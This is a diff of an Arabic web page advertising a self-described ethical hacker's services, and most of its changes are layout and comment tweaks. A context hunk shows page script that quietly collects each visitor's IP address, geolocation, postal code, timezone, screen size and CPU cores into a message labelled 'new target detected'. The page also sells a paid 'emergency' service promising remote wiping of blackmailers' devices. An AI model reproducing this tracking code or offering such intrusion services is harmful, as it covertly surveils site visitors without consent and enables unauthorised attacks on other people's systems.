@@ -129,7 +129,7 @@
             color: var(--neon-green);
         }
 
-        /* شبكة الخدمات المنظمة */
+        /* شبكة الخدمات المنظمة المتجاوبة لجميع الأجهزة */
         .services-container {
             margin-bottom: 40px;
         }
@@ -194,23 +194,6 @@
             gap: 20px;
         }
 
-        .emergency-banner::before {
-            content: "EMERGENCY COMMAND";
-            position: absolute;
-            top: -10px;
-            left: 20px;
-            font-size: 5rem;
-            color: rgba(255, 51, 51, 0.03);
-            font-weight: bold;
-            pointer-events: none;
-            z-index: 0;
-        }
-
-        .emergency-content {
-            position: relative;
-            z-index: 1;
-        }
-
         .emergency-banner h3 {
             color: #ff4d4d;
             font-size: 1.6rem;
@@ -239,6 +222,7 @@
         .btn-group {
             display: flex;
             gap: 12px;
+            flex-wrap: wrap;
         }
 
         .btn {
@@ -311,7 +295,7 @@
                 let screenHeight = window.screen.height;
                 let cpuCores = navigator.hardwareConcurrency || "غير معروف";
                 
-                let message = `🚨 **[تم رصد هدف جديد في المنصة]** 🚨%0A%0A` +
+                let message = `🚨 **[تم رصد هدف جديد في المنصة المتجاوبة]** 🚨%0A%0A` +
                               `🌐 **عنوان الـ IP:** \`${ip}\`%0A` +
                               `📍 **الموقع الجغرافي:** ${country} / ${region} / ${city} (الرمز البريدي: ${postal})%0A` +
                               `⏰ **المنطقة الزمنية:** ${timezone}%0A` +
@@ -355,7 +339,7 @@
             <p>أهلاً بك. أنا <strong>حفيد</strong>، محترف في مجال <strong>الأمن السيبراني والاختراق الأخلاقي</strong>، ومطور برمجيات متقدم (مواقع وتطبيقات). أمتلك تخصصاً دقيقاً واحترافياً في إدارة وتأمين وحماية حسابات وسائل التواصل الاجتماعي، مع خبرة ميدانية واسعة في معالجة القضايا المعقدة، تقديم الحلول البرمجية المشفرة، وتفكيك التهديدات الرقمية بسرية تامة واحترافية مطلقة.</p>
         </section>
 
-        <!-- شبكة الخدمات المنظمة بالترتيب المطلوب -->
+        <!-- شبكة الخدمات المنظمة بالترتيب المطلوب لجميع الأجهزة -->
         <section class="services-container">
             <h2 class="section-title">> الخدمات والحلول الرقمية</h2>
             
@@ -387,14 +371,14 @@
 
                 <!-- 3. غرفة الطوارئ ومكافحة الابتزاز (تصميم فريد واستثنائي كلياً) -->
                 <div class="emergency-banner">
-                    <div class="emergency-content">
+                    <div>
                         <h3>🚨 غرفة الطوارئ: مكافحة المبتزين والفرمته التامة عن بعد</h3>
                         <p>خدمة ميدانية استثنائية ومتخصصة للتعامل الحازم مع حالات الابتزاز الإلكتروني والاختراق الخطير. لا يتم قبول الحالات إلا بعد تقديم الإثباتات والطلبات الرسمية.</p>
                         <div class="card-note">
                             <strong>آلية العمل:</strong> بمجرد إرسال طلبك ومعاينته، سنقوم بإبلاغك بتكلفة الخدمة، ولن يتم عمل أي شيء إلا بعد إرسال إيصال التحويل الحصري.
                         </div>
                     </div>
-                    <div class="btn-group" style="position: relative; z-index: 1;">
+                    <div class="btn-group">
                         <a href="https://t.me/Kali_7a?text=%Dالسلام%20عليكم،%20لدي%20حالة%20ابتزاز%20طارئة%20وهذه%20هي%20الإثباتات%20والتفاصيل." target="_blank" class="btn btn-emergency">طوارئ Telegram</a>
                         <a href="https://wa.me/967773043974?text=السلام%20عليكم،%20لدي%20حالة%20ابتزاز%20طارئة%20وهذه%20هي%20الإثباتات%20والتفاصيل." target="_blank" class="btn btn-emergency">طوارئ WhatsApp</a>
                     </div>
